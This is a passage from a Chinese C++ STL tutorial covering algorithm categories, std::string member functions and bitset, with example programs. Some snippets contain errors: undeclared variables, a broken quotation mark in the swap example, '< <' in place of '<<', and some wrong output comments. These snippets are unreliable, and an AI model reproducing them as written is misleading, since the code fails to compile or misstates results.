&lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        pq2.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//上面输出 3.2 5.4 9.8 9.8</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序的输出结果是：<br>9.8 9.8 5.4 3.2<br>3.2 5.4 9.8 9.8</p>
<p>pq2 的排序规则和 pq1 相反，因此元素出队的顺序也相反。</p>
<h4 id="C-算法分类"><a href="#C-算法分类" class="headerlink" title="C++算法分类"></a>C++算法分类</h4><p>在 <a href="http://c.biancheng.net/stl/">STL</a> 中，算法就是函数模板。STL 中的算法大多数是用来对容器进行操作的，如排序、 查找等。大部分算法都是在头文件 <algorithm> 中定义的，还有些算法用于数值处理，定义在头文件 <numeric> 中。</numeric></algorithm></p>
<p>不同的教程对 STL 中的算法有不同的分类方法。本教程将算法分为以下七类：</p>
<ol>
<li>不变序列算法。</li>
<li>变值算法。</li>
<li>删除算法。</li>
<li>变序算法。</li>
<li>排序算法。</li>
<li>有序区间算法。</li>
<li>数值算法。</li>
</ol>
<p>本教程介绍前六类算法。第七类算法共有三个，除了前面已经介绍过的 accumulate 以外，另外两个算法既不常用，讲解起来又比较烦琐，本教程就不介绍了，有需要的读者可自行查阅相关资料。</p>
<p>有的算法可能同时属于多个分类。</p>
<p>许多算法都是重载的，有不止一个版本。篇幅所限，本教程往往只能列出其中的一个版本。有些算法也不给出原型，直接通过程序来演示其用法。</p>
<p>实际上，大多数重载的算法都有两个版本，其中一个用<code>==</code>判断元素是否相等，或用<code>&lt;</code>比较大小；而另一个版本多出来一个类型参数 Pred 以及函数形参 Pred op，该版本通过表达式<code>op(x, y)</code>的返回值是 true 还是 false 来判断 x 是否“等于”y 或者“小于”y。例如，在《<a href="http://c.biancheng.net/view/354.html">C++函数对象详解</a>》一节中的“应用实例2”中提到的 sort，再如下面有两个版本的 min_element：</p>
<p>iterate min_element(iterate first, iterate last);<br>iterate min_element(iterate first, iterate last, Pred op);</p>
<p>min_element 返回区间中最小的元素。第一个版本用<code>&lt;</code>比较大小，而第二个版本用自定义的比较器 op 来比较大小，op(x, y) 的值为 true，则说明 x 比 y 小。</p>
<p>类似 sort 和 min_element 这样有可自定义比较器版本的算法，在后文的表格中列出时，将加注“（可自定义比较器）”。</p>
<h4 id="C-string类（C-字符串）完全攻略"><a href="#C-string类（C-字符串）完全攻略" class="headerlink" title="C++ string类（C++字符串）完全攻略"></a>C++ string类（C++字符串）完全攻略</h4><p>string 类是 <a href="http://c.biancheng.net/stl/">STL</a> 中 basic_string 模板实例化得到的模板类。其定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> basic_string &lt;<span class="keyword">char</span>&gt; <span class="built_in">string</span>;</span><br></pre></td></tr></table></figure>
<p>basic_string 此处可以不必深究。</p>
<p>string 类的成员函数有很多，同一个名字的函数也常会有五六个重载的版本。篇幅所限，不能将这些原型一一列出并加以解释。这里仅对常用成员函数按功能进行分类，并直接给出应用的例子，通过例子，读者可以基本掌握这些成员函数的用法。</p>
<p>要想更深入地了解 string 类，还要阅读 <a href="http://c.biancheng.net/cplus/">C++</a> 的参考手册或编译器自带的联机资料。对于前面介绍过的字符串处理的内容，这里不再重复说明。</p>
<p><strong>1. 构造函数</strong></p>
<p>string 类有多个构造函数，用法示例如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">s1</span><span class="params">()</span></span>;  <span class="comment">// si = &quot;&quot;</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">s2</span><span class="params">(<span class="string">&quot;Hello&quot;</span>)</span></span>;  <span class="comment">// s2 = &quot;Hello&quot;</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">s3</span><span class="params">(<span class="number">4</span>, <span class="string">&#x27;K&#x27;</span>)</span></span>;  <span class="comment">// s3 = &quot;KKKK&quot;</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">s4</span><span class="params">(<span class="string">&quot;12345&quot;</span>, <span class="number">1</span>, <span class="number">3</span>)</span></span>;  <span class="comment">//s4 = &quot;234&quot;，即 &quot;12345&quot; 的从下标 1 开始，长度为 3 的子串</span></span><br></pre></td></tr></table></figure>
<p>为称呼方便，本教程后文将从字符串下标 n 开始、长度为 m 的字符串称为“子串(n, m)”。</p>
<p>string 类没有接收一个整型参数或一个字符型参数的构造函数。下面的两种写法是错误的：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">s1</span><span class="params">(<span class="string">&#x27;K&#x27;</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">s2</span><span class="params">(<span class="number">123</span>)</span></span>;</span><br></pre></td></tr></table></figure>
<p><strong>2. 对 string 对象赋值</strong></p>
<p>可以用 char* 类型的变量、常量，以及 char 类型的变量、常量对 string 对象进行赋值。例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> s1;</span><br><span class="line">s1 = <span class="string">&quot;Hello&quot;</span>;  <span class="comment">// s1 = &quot;Hello&quot;</span></span><br><span class="line">s2 = <span class="string">&#x27;K&#x27;</span>;  <span class="comment">// s2 = &quot;K”</span></span><br></pre></td></tr></table></figure>
<p>string 类还有 assign 成员函数，可以用来对 string 对象赋值。assign 成员函数返回对象自身的引用。例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">string s1(&quot;12345&quot;), s2;</span><br><span class="line">s3.assign(s1);  <span class="comment">// s3 = s1</span></span><br><span class="line">s2.assign(s1, <span class="number">1</span>, <span class="number">2</span>);  <span class="comment">// s2 = &quot;23&quot;，即 s1 的子串(1, 2)</span></span><br><span class="line">s2.assign(<span class="number">4</span>, <span class="string">&#x27;K&#x27;</span>);  <span class="comment">// s2 = &quot;KKKK&quot;</span></span><br><span class="line">s2.assign(<span class="string">&quot;abcde&quot;</span>, <span class="number">2</span>, <span class="number">3</span>);  <span class="comment">// s2 = &quot;cde&quot;，即 &quot;abcde&quot; 的子串(2, 3)</span></span><br></pre></td></tr></table></figure>
<p><strong>3. 求字符串的长度</strong></p>
<p>length 成员函数返回字符串的长度。size 成员函数可以实现同样的功能。</p>
<p><strong>4. string对象中字符串的连接</strong></p>
<p>除了可以使用<code>+</code>和<code>+=</code>运算符对 string 对象执行字符串的连接操作外，string 类还有 append 成员函数，可以用来向字符串后面添加内容。append 成员函数返回对象自身的引用。例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">string s1(&quot;123&quot;), s2(&quot;abc&quot;);</span><br><span class="line">s1.append(s2);  <span class="comment">// s1 = &quot;123abc&quot;</span></span><br><span class="line">s1.append(s2, <span class="number">1</span>, <span class="number">2</span>);  <span class="comment">// s1 = &quot;123abcbc&quot;</span></span><br><span class="line">s1.append(<span class="number">3</span>, <span class="string">&#x27;K&#x27;</span>);  <span class="comment">// s1 = &quot;123abcbcKKK&quot;</span></span><br><span class="line">s1.append(<span class="string">&quot;ABCDE&quot;</span>, <span class="number">2</span>, <span class="number">3</span>);  <span class="comment">// s1 = &quot;123abcbcKKKCDE&quot;，添加 &quot;ABCDE&quot; 的子串(2, 3)</span></span><br></pre></td></tr></table></figure>
<p><strong>5. string对象的比较</strong></p>
<p>除了可以用 &lt;、&lt;=、==、!=、&gt;=、&gt; 运算符比较 string 对象外，string 类还有 compare 成员函数，可用于比较字符串。compare 成员函数有以下返回值：</p>
<ul>
<li>小于 0 表示当前的字符串小；</li>
<li>等于 0 表示两个字符串相等；</li>
<li>大于 0 表示另一个字符串小。</li>
</ul>
<p>例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">string s1(&quot;hello&quot;), s2(&quot;hello, world&quot;);</span><br><span class="line"><span class="keyword">int</span> n = s1.compare(s2);</span><br><span class="line">n = s1.compare(<span class="number">1</span>, <span class="number">2</span>, s2, <span class="number">0</span>, <span class="number">3</span>);  <span class="comment">//比较s1的子串 (1,2) 和s2的子串 (0,3)</span></span><br><span class="line">n = s1.compare(<span class="number">0</span>, <span class="number">2</span>, s2);  <span class="comment">// 比较s1的子串 (0,2) 和 s2</span></span><br><span class="line">n = s1.compare(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">n = s1.compare(<span class="number">1</span>, <span class="number">2</span>, <span class="string">&quot;Hello&quot;</span>);  <span class="comment">//比较 s1 的子串(1,2)和&quot;Hello”</span></span><br><span class="line">n = s1.compare(<span class="number">1</span>, <span class="number">2</span>, <span class="string">&quot;Hello&quot;</span>, <span class="number">1</span>, <span class="number">2</span>);  <span class="comment">//比较 s1 的子串(1,2)和 &quot;Hello&quot; 的子串(1,2)</span></span><br></pre></td></tr></table></figure>
<p><strong>6. 求 string 对象的子串</strong></p>
<p>substr 成员函数可以用于求子串 (n, m)，原型如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">substr</span><span class="params">(<span class="keyword">int</span> n = <span class="number">0</span>, <span class="keyword">int</span> m = <span class="built_in">string</span>::npos)</span> <span class="keyword">const</span></span>;</span><br></pre></td></tr></table></figure>
<p>调用时，如果省略 m 或 m 超过了字符串的长度，则求出来的子串就是从下标 n 开始一直到字符串结束的部分。例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> s1 = <span class="string">&quot;this is ok&quot;</span>;</span><br><span class="line"><span class="built_in">string</span> s2 = s1.substr(<span class="number">2</span>, <span class="number">4</span>);  <span class="comment">// s2 = &quot;is i&quot;</span></span><br><span class="line">s2 = s1.substr(<span class="number">2</span>);  <span class="comment">// s2 = &quot;is is ok&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>7. 交换两个string对象的内容</strong></p>
<p>swap 成员函数可以交换两个 string 对象的内容。例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">s1</span><span class="params">(<span class="string">&quot;West”), s2(&quot;</span>East<span class="string">&quot;);</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="string">s1.swap(s2);  // s1 = &quot;</span>East<span class="string">&quot;，s2 = &quot;</span>West<span class="string">&quot;</span></span></span></span><br></pre></td></tr></table></figure>
<p><strong>8. 查找子串和字符</strong></p>
<p>string 类有一些查找子串和字符的成员函数，它们的返回值都是子串或字符在 string 对象字符串中的位置（即下标）。如果查不到，则返回 string::npos。string: :npos 是在 string 类中定义的一个静态常量。这些函数如下：</p>
<ul>
<li>find：从前往后查找子串或字符出现的位置。</li>
<li>rfind：从后往前查找子串或字符出现的位置。</li>
<li>find_first_of：从前往后查找何处出现另一个字符串中包含的字符。例如：</li>
<li>s1.find_first_of(“abc”); //查找s1中第一次出现”abc”中任一字符的位置</li>
<li>find_last_of：从后往前查找何处出现另一个字符串中包含的字符。</li>
<li>find_first_not_of：从前往后查找何处出现另一个字符串中没有包含的字符。</li>
<li>find_last_not_of：从后往前查找何处出现另一个字符串中没有包含的字符。</li>
</ul>
<p>下面是 string 类的查找成员函数的示例程序。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">s1</span><span class="params">(<span class="string">&quot;Source Code&quot;</span>)</span></span>;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">if</span> ((n = s1.find(<span class="string">&#x27;u&#x27;</span>)) != <span class="built_in">string</span>::npos) <span class="comment">//查找 u 出现的位置</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1) &quot;</span> &lt;&lt; n &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; s1.substr(n) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//输出 l)2,urce Code</span></span><br><span class="line">    <span class="keyword">if</span> ((n = s1.find(<span class="string">&quot;Source&quot;</span>, <span class="number">3</span>)) == <span class="built_in">string</span>::npos)</span><br><span class="line">        <span class="comment">//从下标3开始查找&quot;Source&quot;，找不到</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2) &quot;</span> &lt;&lt; <span class="string">&quot;Not Found&quot;</span> &lt;&lt; <span class="built_in">endl</span>;  <span class="comment">//输出 2) Not Found</span></span><br><span class="line">    <span class="keyword">if</span> ((n = s1.find(<span class="string">&quot;Co&quot;</span>)) != <span class="built_in">string</span>::npos)</span><br><span class="line">        <span class="comment">//查找子串&quot;Co&quot;。能找到，返回&quot;Co&quot;的位置</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;3) &quot;</span> &lt;&lt; n &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; s1.substr(n) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//输出 3) 7, Code</span></span><br><span class="line">    <span class="keyword">if</span> ((n = s1.find_first_of(<span class="string">&quot;ceo&quot;</span>)) != <span class="built_in">string</span>::npos)</span><br><span class="line">        <span class="comment">//查找第一次出现或 &#x27;c&#x27;、&#x27;e&#x27;或&#x27;o&#x27;的位置</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;4) &quot;</span> &lt;&lt; n &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; s1.substr(n) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//输出 4) l, ource Code</span></span><br><span class="line">    <span class="keyword">if</span> ((n = s1.find_last_of(<span class="string">&#x27;e&#x27;</span>)) != <span class="built_in">string</span>::npos)</span><br><span class="line">        <span class="comment">//查找最后一个 &#x27;e&#x27; 的位置</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;5) &quot;</span> &lt;&lt; n &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; s1.substr(n) &lt;&lt; <span class="built_in">endl</span>;  <span class="comment">//输出 5) 10, e</span></span><br><span class="line">    <span class="keyword">if</span> ((n = s1.find_first_not_of(<span class="string">&quot;eou&quot;</span>, <span class="number">1</span>)) != <span class="built_in">string</span>::npos)</span><br><span class="line">        <span class="comment">//从下标1开始查找第一次出现非 &#x27;e&#x27;、&#x27;o&#x27; 或 &#x27;u&#x27; 字符的位置</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;6) &quot;</span> &lt;&lt; n &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; s1.substr(n) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//输出 6) 3, rce Code</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>9. 替换子串</strong></p>
<p>replace 成员函数可以对 string 对象中的子串进行替换，返回值为对象自身的引用。例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">s1</span><span class="params">(<span class="string">&quot;Real Steel&quot;</span>)</span></span>;</span><br><span class="line">s1.replace(<span class="number">1</span>, <span class="number">3</span>, <span class="string">&quot;123456&quot;</span>, <span class="number">2</span>, <span class="number">4</span>);  <span class="comment">//用 &quot;123456&quot; 的子串(2,4) 替换 s1 的子串(1,3)</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; s1 &lt;&lt; <span class="built_in">endl</span>;  <span class="comment">//输出 R3456 Steel</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">s2</span><span class="params">(<span class="string">&quot;Harry Potter&quot;</span>)</span></span>;</span><br><span class="line">s2.replace(<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="string">&#x27;0&#x27;</span>);  <span class="comment">//用 5 个 &#x27;0&#x27; 替换子串(2,3)</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; s2 &lt;&lt; <span class="built_in">endl</span>;  <span class="comment">//输出 HaOOOOO Potter</span></span><br><span class="line"><span class="keyword">int</span> n = s2.find(<span class="string">&quot;OOOOO&quot;</span>);  <span class="comment">//查找子串 &quot;00000&quot; 的位置，n=2</span></span><br><span class="line">s2.replace(n, <span class="number">5</span>, <span class="string">&quot;XXX&quot;</span>);  <span class="comment">//将子串(n,5)替换为&quot;XXX&quot;</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; s2 &lt; &lt; <span class="built_in">endl</span>;  <span class="comment">//输出 HaXXX Potter</span></span><br></pre></td></tr></table></figure>
<p><strong>10. 删除子串</strong></p>
<p>erase 成员函数可以删除 string 对象中的子串，返回值为对象自身的引用。例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">s1</span><span class="params">(<span class="string">&quot;Real Steel&quot;</span>)</span></span>;</span><br><span class="line">s1.erase(<span class="number">1</span>, <span class="number">3</span>);  <span class="comment">//删除子串(1, 3)，此后 s1 = &quot;R Steel&quot;</span></span><br><span class="line">s1.erase(<span class="number">5</span>);  <span class="comment">//删除下标5及其后面的所有字符，此后 s1 = &quot;R Ste&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>11. 插入字符串</strong></p>
<p>insert 成员函数可以在 string 对象中插入另一个字符串，返回值为对象自身的引用。例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">string s1(&quot;Limitless&quot;), s2(&quot;00&quot;);</span><br><span class="line">s1.insert(<span class="number">2</span>, <span class="string">&quot;123&quot;</span>);  <span class="comment">//在下标 2 处插入字符串&quot;123&quot;，s1 = &quot;Li123mitless&quot;</span></span><br><span class="line">s1.insert(<span class="number">3</span>, s2);  <span class="comment">//在下标 2 处插入 s2 , s1 = &quot;Li10023mitless&quot;</span></span><br><span class="line">s1.insert(<span class="number">3</span>, <span class="number">5</span>, <span class="string">&#x27;X&#x27;</span>);  <span class="comment">//在下标 3 处插入 5 个 &#x27;X&#x27;，s1 = &quot;Li1XXXXX0023mitless&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>12. 将 string 对象作为流处理</strong></p>
<p>使用流对象 istringstream 和 ostringstream，可以将 string 对象当作一个流进行输入输出。使用这两个类需要包含头文件 sstream。</p>
<p>示例程序如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">src</span><span class="params">(<span class="string">&quot;Avatar 123 5.2 Titanic K&quot;</span>)</span></span>;</span><br><span class="line">    <span class="function"><span class="built_in">istringstream</span> <span class="title">istrStream</span><span class="params">(src)</span></span>; <span class="comment">//建立src到istrStream的联系</span></span><br><span class="line">    <span class="built_in">string</span> s1, s2;</span><br><span class="line">    <span class="keyword">int</span> n;  <span class="keyword">double</span> d;  <span class="keyword">char</span> c;</span><br><span class="line">    istrStream &gt;&gt; s1 &gt;&gt; n &gt;&gt; d &gt;&gt; s2 &gt;&gt; c; <span class="comment">//把src的内容当做输入流进行读取</span></span><br><span class="line">    <span class="built_in">ostringstream</span> ostrStream;</span><br><span class="line">    ostrStream &lt;&lt; s1 &lt;&lt; <span class="built_in">endl</span> &lt;&lt; s2 &lt;&lt; <span class="built_in">endl</span> &lt;&lt; n &lt;&lt; <span class="built_in">endl</span> &lt;&lt; d &lt;&lt; <span class="built_in">endl</span> &lt;&lt; c &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ostrStream.str();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序的输出结果是：<br>Avatar<br>Titanic<br>123<br>5.2<br>K</p>
<p>第 11 行，从输入流 istrStream 进行读取，过程和从 cin 读取一样，只不过输入的来源由键盘变成了 string 对象 src。因此，”Avatar” 被读取到 s1，123 被读取到 n，5.2 被读取到 d，”Titanic” 被读取到s2，’K’ 被读取到 c。</p>
<p>第 12 行，将变量的值输出到流 ostrStream。输出结果不会出现在屏幕上，而是被保存在 ostrStream 对象管理的某处。用 ostringstream 类的 str 成员函数能将输出到 ostringstream 对象中的内容提取出来。</p>
<p><strong>13. 用 STL 算法操作 string 对象</strong></p>
<p>string 对象也可以看作一个顺序容器，它支持随机访问迭代器，也有 begin 和 end 等成员函数。STL 中的许多算法也适用于 string 对象。下面是用 STL 算法操作 string 对象的程序示例。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">s</span><span class="params">(<span class="string">&quot;afgcbed&quot;</span>)</span></span>;</span><br><span class="line">    <span class="built_in">string</span>::iterator p = find(s.begin(), s.end(), <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (p!= s.end())</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; p - s.begin() &lt;&lt; <span class="built_in">endl</span>;  <span class="comment">//输出 3</span></span><br><span class="line">    sort(s.begin(), s.end());</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; s &lt;&lt; <span class="built_in">endl</span>;  <span class="comment">//输出 abcdefg</span></span><br><span class="line">    next_permutation(s.begin(), s.end());</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; s &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出 abcdegf</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="C-bitset类详解"><a href="#C-bitset类详解" class="headerlink" title="C++ bitset类详解"></a>C++ bitset类详解</h4><p>bitset 模板类由若干个位（bit）组成，它提供一些成员函数，使程序员不必通过位运算就能很方便地访问、修改其中的任意一位。bitset 模板类在头文件 <bitset> 中定义如下：</bitset></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">size_t</span> N&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bitset</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>size_t 可看作 unsigned int。将 bitset 实例化时，N 必须是一个整型常数。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitset &lt;40&gt; bst;</span><br></pre></td></tr></table></figure>
<p>则 bst 是一个由 40 个位组成的对象，用 bitset 的成员函数可以方便地访问其中任意一位。bitset 中的位从 0 开始编号，第 0 位是最右边的位。</p>
<p>bitset 有许多成员函数，有些成员函数执行的就是类似于位运算的操作。bitset 成员函数列表如下：</p>
<ul>
<li>bitset <N> &amp; operator &amp;= (const bitset <N> &amp; rhs); //和另一个 bitset 对象进行与操作</N></N></li>
<li>bitset <N> &amp; operator |= (const bitset <N> &amp; rhs); //和另一个 bitset 对象进行或操作</N></N></li>
<li>bitset <N> &amp; operator ^= (const bitset <N> &amp; rhs); //和另一个 bitset 对象进行异或操作</N></N></li>
<li>bitset <N> &amp; operator &lt;&lt;= (size_t num); //左移 num 位</N></li>
<li>bitset <N> &amp; operator &gt;&gt;= (size_t num); //右移 num 位</N></li>
<li>bitset <N> &amp; set(); //将所有位全部设成 1</N></li>
<li>bitset <N> &amp; set(size_t pos, bool val = true); //将第 pos 位设为 val</N></li>
<li>bitset <N> &amp; reset(); //将所有位全部设成0</N></li>
<li>bitset <N> &amp; reset (size_t pos); //将第 pos 位设成 0</N></li>
<li>bitset <N> &amp; flip(); //将所有位翻转（0变成1，1变成0）</N></li>
<li>bitset <N> &amp; flip(size_t pos); //翻转第 pos 位</N></li>
<li>reference operator[] (size_t pos); //返回对第 pos 位的引用</li>
<li>bool operator[] (size_t pos) const; //返回第 pos 位的值</li>
<li>reference at(size_t pos); //返回对第 pos 位的引用</li>
<li>bool at (size_t pos) const; //返回第 pos 位的值</li>
<li>unsigned long to_ulong() const; //将对象中的0、1串转换成整数</li>
<li>string to_string () const; //将对象中的0、1串转换成字符串（Visual Studio 支持，Dev <a href="http://c.biancheng.net/cplus/">C++</a> 不支持）</li>
<li>size_t count() const; //计算 1 的个数</li>
<li>size_t size () const; //返回总位数</li>
<li>bool operator == (const bitset <N> &amp; rhs) const;</N></li>
<li>bool operator != (const bitset <N> &amp; rhs) const;</N></li>
<li>bool test(size_t pos) const; //测试第 pos 位是否为 1</li>
<li>bool any() const; //判断是否有某位为1</li>
<li>bool none() const; //判断是否全部为0</li>
<li>bitset <N> operator &lt;&lt; (size_t pos) const; //返回左移 pos 位后的结果</N></li>
<li>bitset <N> operator &gt;&gt; (size_t pos) const; //返回右移 pos 位后的结果</N></li>
<li>bitset <N> operator ~ (); //返回取反后的结果</N></li>
<li>bitset <N> operator &amp; (const bitset <N> &amp; rhs) const; //返回和另一个 bitset 对象 rhs 进行与运算的结果</N></N></li>
<li>bitset <N> operator | (const bitset <N> &amp; rhs) const; //返回和另一个 bitset 对象 rhs 进行或运算的结果</N></N></li>
<li>bitset <N> operator ^ (const bitset <N> &amp; rhs) const; //返回和另一个 bitset 对象 rhs 进行异或运算的结果</N></N></li>
</ul>
<p>下面的程序演示了 bitset 的用法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bitset&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">bitset</span>&lt;7&gt; bst1;</span><br><span class="line">    <span class="built_in">bitset</span>&lt;7&gt; bst2;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1) &quot;</span> &lt;&lt; bst1 &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出 1) 0000000</span></span><br><span class="line">    bst1.<span class="built_in">set</span>(<span class="number">0</span>,<span class="number">1</span>);<span class="comment">//将第0位变成1，bst1变为 0000001</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2) &quot;</span> &lt;&lt; bst1 &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出 2) 0000001</span></span><br><span class="line">    bst1 &lt;&lt;= <span class="number">4</span>; <span class="comment">//左移4位，变为 0010000</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;3) &quot;</span> &lt;&lt; bst1 &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出 3) 0010000</span></span><br><span class="line">    bst2.<span class="built_in">set</span>(<span class="number">2</span>);<span class="comment">//第二位设置为1，bst2变成  0000100</span></span><br><span class="line">    bst2 |=bst1; <span class="comment">// bst2变成  0010100</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;4) &quot;</span> &lt;&lt; bst2 &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出 4) 0010100</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;5) &quot;</span> &lt;&lt; bst2.to_ulong () &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出 5) 20</span></span><br><span class="line">    bst2.flip(); <span class="comment">//每一位都取反，bst2变成 1101011</span></span><br><span class="line">    bst1.<span class="built_in">set</span>(<span class="number">3</span>); <span class="comment">//bst1变成  0011000</span></span><br><span class="line">    bst2.flip(<span class="number">6</span>); <span class="comment">//bst2变成 0101011</span></span><br><span class="line">    <span class="built_in">bitset</span>&lt;7&gt; bst3 = bst2^ bst1;<span class="comment">//bst3 变成 0110011</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;6) &quot;</span> &lt;&lt; bst3 